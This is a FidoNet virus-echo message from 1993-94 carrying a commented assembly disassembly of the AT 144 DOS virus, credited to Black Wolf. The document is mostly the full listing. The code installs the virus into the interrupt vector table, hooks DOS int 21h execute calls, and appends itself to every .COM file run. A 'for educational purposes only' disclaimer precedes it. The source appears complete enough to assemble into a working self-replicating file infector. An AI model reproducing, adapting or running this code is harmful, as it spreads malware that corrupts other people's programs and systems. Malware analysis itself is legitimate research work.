;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 7 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : AT_144.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Doug Bryce, 2:283/718 (06 Nov 94 16:24)
;* To   : Mike Salvino
;* Subj : AT_144.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
;This is a disassembly of the AT 144 virus.  It is processor specific
;and will only run on AT-class machines (286+).  It copies itself
;onto the interrupt table and hooks int 21h, function 4bh.  Because
;it is on the interrupt table - to call Int 21h in its infection routine
;it merely calls an INT corresponding to where it stores its
;old handler vectors.  In this case - it is Int B4h.  One interesting thing
;is the JMP SI instruction at the end to return to the host - this
;works because DOS initially sets SI to 100 for running COM files.
;This virus infects any .COM file executed.

;Please - Do NOT release this or any other virus.
;For educational purposes ONLY!  I take no responsibility for damages caused
;by the misuse of this or any other disassembly - they are made to help
;educate programmers as to the workings of the individual viruses and
;viruses as a whole.  Such information MUST remain free and uncensored.

;Disassembly by Black Wolf

.model tiny
.286
.code
    org 100h

start:
        db      0e9h,02,0               ;Jump Virus_Entry

Host_File:
        int     21h                     ;Terminate.

Virus_Entry:
        pusha
        mov     di,si
        call    Get_Displacement

Get_Displacement:
        pop     si
        add     si,31h                  ;SI = storage bytes
        movsb
        movsw                           ;Restore host in memory.

        mov     ax,24h                  ;Set ES:DI to interrupt table
        mov     es,ax                   ;DS:SI to beginning of virus
        xor     di,di
        sub     si,3Ah
        cmp     byte ptr es:[di],60h    ;Check if installed.
        mov     cl,90h
        rep     movsb                   ;Copy virus into memory

        jz      Done_Install
        mov     ds,cx
        mov     si,84h                  ;Get Int 21 vector.
        movsw
        movsw
        mov     word ptr [si-4],3Ah     ;Hook Int 21
        mov     [si-2],ax
        push    cs
        pop     ds

Done_Install:
        push    cs
        pop     es
        popa
        jmp     si                      ;Jumps back to host....
                        ;DOS sets SI = 100h when
                        ;a COM is loaded.
Jump_Byte       db      0e9h
Storage_Bytes:
        mov     ax,4c00h

Int_21_Handler:
        pusha                           ;Save all Regs.
        push    ds
        xor     ah,4Bh                  ;Check if execute
        jnz     Exit_Handler
        mov     ax,3D02h
        int     0B4h                    ;Open the file for read/write
        jc      Exit_Handler
        mov     bx,ax
        push    cs
        pop     ds
        mov     ah,3Fh
        mov     cx,3
        mov     dx,37h
        mov     si,dx
        int     0B4h                    ;Read in 3 bytes for storage.
        cmp     byte ptr [si],4Dh
        je      Close_File              ;Check if it's an EXE
        mov     ax,4202h
        xor     cx,cx
        xor     dx,dx
        int     0B4h                    ;Go to end of file
        sub     al,3                    ;save jump size.
        mov     bp,ax
        mov     cl,90h                  ;If the 2nd and 3rd bytes of
        sub     ax,cx                   ;the file correspond to what
        cmp     ax,[si+1]               ;a jump WOULD be if the virus
                        ;were already there, exit.
        je      Close_File              ;(Quit if infected)
        mov     ah,40h                  ;Append Virus
        int     0B4h
        mov     ax,4200h
        xor     cx,cx
        int     0B4h                    ;Go back to the beginning
        mov     ah,40h
        lea     dx,[si-1]
        mov     cl,3
        mov     [si],bp
        int     0B4h                    ;Write in the jump.

Close_File:
        mov     ah,3Eh
        int     0B4h                    ;Close file.
Exit_Handler:
        pop     ds
        popa                            ;Exit Handler
        db      0EAh                    ;Far Jump to old Int 21h.
end_virus:
end     start

;-+-  Concord/QWK O.O1 Beta-7
; + Origin: NETTIS Public Acces Internet (603)432-2517 (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/x            Include false conditionals in listing
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

